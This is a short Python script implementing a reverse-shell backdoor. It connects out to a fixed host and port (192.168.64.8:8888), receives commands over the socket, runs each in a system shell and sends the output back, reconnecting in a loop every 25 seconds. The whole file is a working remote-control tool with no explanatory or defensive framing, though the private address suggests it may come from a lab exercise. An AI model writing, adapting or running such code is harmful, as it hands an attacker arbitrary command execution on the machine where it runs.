import socket
import subprocess
import time

REMOTE_HOST = '192.168.64.8'
REMOTE_PORT = 8888


def thread_creation():
  while True:
    time.sleep(25)
    try: 
      client.connect((REMOTE_HOST, REMOTE_PORT))
      start_command()
      client.close()
    except:
      thread_creation()


def start_command():
  while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)



client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client = socket.socket()
print("[-] Litening connection...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")
thread_creation()

